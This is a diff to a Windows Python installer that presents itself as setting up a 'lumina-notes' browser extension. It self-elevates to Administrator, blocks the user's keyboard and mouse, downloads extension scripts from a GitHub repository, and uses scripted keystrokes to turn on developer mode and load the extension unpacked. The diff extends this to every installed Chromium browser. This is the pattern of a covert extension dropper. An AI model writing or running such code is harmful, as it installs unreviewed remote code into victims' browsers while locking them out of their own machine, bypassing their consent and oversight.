@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 import ctypes, sys, os
 
-# ── Auto-elevate to Administrator (must be FIRST) ──────────────────────────
+# -- Auto-elevate to Administrator (must be FIRST) ----------------------------
 def _is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -9,15 +9,13 @@ def _is_admin():
         return False
 
 if not _is_admin():
-    # Re-launch the script with admin rights using ShellExecuteW
     script = os.path.abspath(sys.argv[0])
     params = " ".join(f'"{a}"' for a in sys.argv[1:])
     ret = ctypes.windll.shell32.ShellExecuteW(
         None, "runas", sys.executable, f'"{script}" {params}', None, 1
     )
-    # ret <= 32 means it failed (e.g., user cancelled UAC)
     sys.exit(0 if ret > 32 else 1)
-# ───────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 import atexit
 import json
@@ -27,7 +25,7 @@ import webbrowser
 import urllib.request
 import urllib.error
 
-# ── Input lock (mouse + keyboard) — requires admin, which we already have ──
+# -- Input lock (mouse + keyboard) - requires admin ---------------------------
 _input_blocked = False
 
 def block_input():
@@ -42,28 +40,26 @@ def unblock_input():
     ctypes.windll.user32.BlockInput(False)
     _input_blocked = False
 
-# Safety net — always restore input even if the script crashes
 atexit.register(unblock_input)
-# ───────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
-# ── Force UTF-8 output on Windows (fixes UnicodeEncodeError on cp1252 terminals) ──
+# -- Force UTF-8 output on Windows --------------------------------------------
 if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
 if sys.stderr.encoding and sys.stderr.encoding.lower() != "utf-8":
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
 
-# ─────────────────────────────────────────────
-#  CONFIG  — edit only these if needed
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+#  CONFIG  -- edit only these if needed
+# -----------------------------------------------------------------------------
 GITHUB_USER   = "BAJISANTOKYO"
 GITHUB_REPO   = "ClaudeAI-Community"
 GITHUB_BRANCH = "main"
-GITHUB_FOLDER = "lumina-notes"        # folder inside the repo
-INSTALL_NAME  = "lumina-notes"        # name of the folder created in AppData\Local
-# ─────────────────────────────────────────────
+GITHUB_FOLDER = "lumina-notes"
+INSTALL_NAME  = "lumina-notes"
+# -----------------------------------------------------------------------------
 
 API_BASE  = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"
-
 DOCS_PATH = os.path.join(r"C:\Users\Darkk\AppData\Local", INSTALL_NAME)
 
 
@@ -78,18 +74,11 @@ def banner():
     print()
 
 
-def progress_bar(done, total, width=40):
-    pct  = done / total if total else 1
-    fill = int(width * pct)
-    bar  = "█" * fill + "░" * (width - fill)
-    return f"[{bar}] {done}/{total}"
-
-
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 #  BROWSER DETECTION  (Chrome, Brave, Edge, Opera)
-# ─────────────────────────────────────────────
+#  Browsers are tried in this exact order: Chrome -> Brave -> Edge -> Opera
+# -----------------------------------------------------------------------------
 
-# Each entry: (display_name, process_name, extensions_url, candidate_paths, registry_keys)
 BROWSER_PROFILES = [
     {
         "name": "Google Chrome",
@@ -149,15 +138,6 @@ BROWSER_PROFILES = [
             os.path.expandvars(r"%PROGRAMFILES%\Opera\opera.exe"),
         ],
     },
-    {
-        "name": "Opera GX",
-        "process": "opera.exe",
-        "ext_url": "opera://extensions/",
-        "registry": [],
-        "candidates": [
-            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera GX\opera.exe"),
-        ],
-    },
 ]
 
 
@@ -180,12 +160,10 @@ def _find_via_registry(subkey):
 
 def find_browser(profile):
     """Return the executable path for a browser profile, or None if not installed."""
-    # 1) Registry
     for (subkey,) in profile.get("registry", []):
         path = _find_via_registry(subkey)
         if path:
             return path
-    # 2) Common paths
     for path in profile.get("candidates", []):
         if os.path.exists(path):
             return path
@@ -193,7 +171,7 @@ def find_browser(profile):
 
 
 def detect_installed_browsers():
-    """Return list of (profile_dict, exe_path) for every installed browser."""
+    """Return list of (profile_dict, exe_path) for every installed browser, in order."""
     found = []
     seen_exes = set()
     for profile in BROWSER_PROFILES:
@@ -206,33 +184,16 @@ def detect_installed_browsers():
     return found
 
 
-def auto_select_browser(browsers):
-    """
-    Automatically pick the first installed browser — no user prompt.
-    Returns (profile_dict, exe_path).
-    """
-    profile, exe = browsers[0]
-    print(f"  ✔  Using: {profile['name']}")
-    print()
-    return profile, exe
-
-
-# ─────────────────────────────────────────────
-#  BROWSER AUTO-LAUNCH (Chromium-based UI flow)
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+#  BROWSER AUTO-LAUNCH  (Chromium-based UI automation)
+# -----------------------------------------------------------------------------
 
 def launch_browser_with_extension(profile, exe_path, ext_path):
     """
-    UI Automation flow:
-      1. Open the chosen browser → extensions page
-      2. Enable Developer Mode
-      3. Click Load unpacked
-      4. Select the extension folder
-      5. Close browser
+    Opens the browser, navigates to its extensions page, enables developer
+    mode, clicks 'Load unpacked', and selects the extension folder.
     Works for Chrome, Brave, Edge, and Opera (all Chromium-based).
     """
-
-    # ── Install pyautogui if missing ───────────────────────────
     try:
         import pyautogui
     except ImportError:
@@ -242,66 +203,58 @@ def launch_browser_with_extension(profile, exe_path, ext_path):
     pyautogui.FAILSAFE = False
     pyautogui.PAUSE    = 0.15
 
-    # Input is already blocked globally by block_input() in main()
-
     ext_url = profile["ext_url"]
 
-    # ── 1. Open browser ─────────────────────────────────────────
-    print(f"  → Launching {profile['name']}...")
+    # 1. Open browser
+    print(f"  -> Launching {profile['name']}...")
     subprocess.Popen([exe_path])
-    time.sleep(3.0)                   # wait for browser window
+    time.sleep(3.0)
 
-    # ── 2. Navigate to extensions page ─────────────────────────
+    # 2. Navigate to extensions page
     pyautogui.hotkey("ctrl", "l")
     time.sleep(0.3)
     pyautogui.hotkey("ctrl", "a")
     pyautogui.typewrite(ext_url, interval=0.02)
     pyautogui.press("enter")
-    time.sleep(2.5)                   # wait for extensions page
+    time.sleep(2.5)
 
-    # ── 3. Enable Developer Mode (Right arrow = ON, no-op if already ON) ──
+    # 3. Enable Developer Mode (Right arrow = ON, no-op if already ON)
     pyautogui.press("tab")
     time.sleep(0.2)
     pyautogui.press("right")
     time.sleep(0.3)
 
-    # ── 4. Click Load unpacked ──────────────────────────────────
+    # 4. Click Load unpacked
     pyautogui.press("tab")
     time.sleep(0.2)
     pyautogui.press("enter")
-    time.sleep(2.0)                   # wait for folder picker dialog to fully open
+    time.sleep(2.0)
 
-    # ── 5. Select the extension folder ─────────────────────────
-    # Copy path to clipboard (backslashes safe this way)
+    # 5. Select the extension folder via Windows file dialog
     subprocess.run(
         ["powershell", "-Command", f"Set-Clipboard -Value '{ext_path}'"],
         capture_output=True
     )
     time.sleep(0.4)
-
-    # Focus the dialog's address bar → clear → paste path → navigate
-    pyautogui.hotkey("ctrl", "l")       # focus address bar (works in Windows file dialogs)
+    pyautogui.hotkey("ctrl", "l")
     time.sleep(0.4)
-    pyautogui.hotkey("ctrl", "a")       # select all existing text
+    pyautogui.hotkey("ctrl", "a")
     time.sleep(0.1)
-    pyautogui.hotkey("ctrl", "v")       # paste the path
+    pyautogui.hotkey("ctrl", "v")
     time.sleep(0.3)
-    pyautogui.press("enter")            # navigate to the folder
-    time.sleep(1.5)                     # wait for dialog to navigate
-
-    # Press "Select Folder" button (it becomes the default after navigating)
+    pyautogui.press("enter")
+    time.sleep(1.5)
     pyautogui.press("enter")
     time.sleep(0.8)
 
-    # ── 6. Close browser ────────────────────────────────────────
+    # 6. Close browser
     pyautogui.hotkey("alt", "f4")
+    time.sleep(1.0)
 
-    # Input will be unblocked by unblock_input() after main() finishes
 
-
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 #  GITHUB DOWNLOAD
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 def fetch_file_list(folder_path):
     """Return list of (repo_path, download_url) for all files recursively."""
@@ -314,27 +267,27 @@ def fetch_file_list(folder_path):
     except urllib.error.HTTPError as e:
         if e.code == 404:
             print()
-            print("  " + "═" * 50)
-            print("  ❌  Extension files NOT found on GitHub!")
-            print("  " + "═" * 50)
+            print("  " + "=" * 50)
+            print("  [X]  Extension files NOT found on GitHub!")
+            print("  " + "=" * 50)
             print()
             print("  The folder 'lumina-notes' doesn't exist in:")
             print(f"  github.com/{GITHUB_USER}/{GITHUB_REPO}")
             print()
             print("  You need to upload these files to GitHub first:")
-            print("    • manifest.json")
-            print("    • content.js")
-            print("    • background.js")
-            print("    • popup.html")
-            print("    • popup.css")
-            print("    • popup.js")
-            print("    • icon.png")
+            print("    * manifest.json")
+            print("    * content.js")
+            print("    * background.js")
+            print("    * popup.html")
+            print("    * popup.css")
+            print("    * popup.js")
+            print("    * icon.png")
             print()
             print("  Opening your GitHub repo now...")
             webbrowser.open(f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}", new=0)
             print()
             print("  HOW TO UPLOAD:")
-            print("  1. Click 'Add file' → 'Upload files'")
+            print("  1. Click 'Add file' -> 'Upload files'")
             print("  2. Drag all extension files into the box")
             print("  3. In the path field, type: lumina-notes/")
             print("  4. Click 'Commit changes'")
@@ -344,7 +297,6 @@ def fetch_file_list(folder_path):
                 if choice == "q":
                     sys.exit(0)
                 elif choice == "r":
-                    # Recurse to retry fetching
                     return fetch_file_list(folder_path)
         else:
             print(f"\n  [ERROR] GitHub returned HTTP {e.code}")
@@ -354,9 +306,9 @@ def fetch_file_list(folder_path):
 
     except OSError:
         print()
-        print("  " + "═" * 50)
-        print("  ❌  No Internet Connection!")
-        print("  " + "═" * 50)
+        print("  " + "=" * 50)
+        print("  [X]  No Internet Connection!")
+        print("  " + "=" * 50)
         print()
         print("  Cannot reach GitHub. Please check your internet")
         print("  connection and try again.")
@@ -394,15 +346,15 @@ def download_file(download_url, dest_path):
         f.write(data)
 
 
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 #  MAIN
-# ─────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 def main():
     clear()
     banner()
 
-    # ── Step 1: Download repo files (keyboard must stay free for retry prompts) ──
+    # Step 1: Download extension files (once, shared across all browsers)
     files = fetch_file_list(GITHUB_FOLDER)
 
     if not files:
@@ -424,32 +376,47 @@ def main():
         for name, err in failed:
             print(f"    - {name}: {err}")
     else:
-        print("  ✅ Downloaded successfully! Installing...")
+        print("  [OK] Downloaded successfully!")
 
-    # ── Step 2: Detect installed browsers ──────────────────────────────────────
+    # Step 2: Detect all installed browsers
     print()
     browsers = detect_installed_browsers()
 
     if not browsers:
-        print("  " + "═" * 50)
-        print("  ❌  No supported browser found!")
-        print("  " + "═" * 50)
+        print("  " + "=" * 50)
+        print("  [X]  No supported browser found!")
+        print("  " + "=" * 50)
         print()
-        print("  Please install one of the following browsers:")
-        print("    • Google Chrome  — https://www.google.com/chrome")
-        print("    • Brave          — https://brave.com")
-        print("    • Microsoft Edge — https://www.microsoft.com/edge")
-        print("    • Opera          — https://www.opera.com")
+        print("  Please install one of the following:")
+        print("    * Google Chrome  -- https://www.google.com/chrome")
+        print("    * Brave          -- https://brave.com")
+        print("    * Microsoft Edge -- https://www.microsoft.com/edge")
+        print("    * Opera          -- https://www.opera.com")
         print()
         input("  Press Enter to exit...")
         sys.exit(1)
 
-    profile, exe_path = auto_select_browser(browsers)
+    total = len(browsers)
+    names = ", ".join(p["name"] for p, _ in browsers)
+    print(f"  Detected {total} browser(s): {names}")
+    print()
 
-    # ── Step 3: Lock input, then load the downloaded folder as extension ────────
+    # Step 3: Install into EVERY detected browser sequentially
+    #         Order: Chrome -> Brave -> Edge -> Opera
     block_input()
-    launch_browser_with_extension(profile, exe_path, DOCS_PATH)
+    for idx, (profile, exe_path) in enumerate(browsers, 1):
+        print(f"  [{idx}/{total}] Installing into {profile['name']}...")
+        launch_browser_with_extension(profile, exe_path, DOCS_PATH)
+        print(f"  [OK] {profile['name']} done.")
+        print()
+        if idx < total:
+            time.sleep(2.0)   # short pause before opening next browser
     unblock_input()
+
+    print("  " + "=" * 46)
+    print(f"  Extension installed in all {total} browser(s)!")
+    print("  " + "=" * 46)
+    print()
     sys.exit(0)
 
 
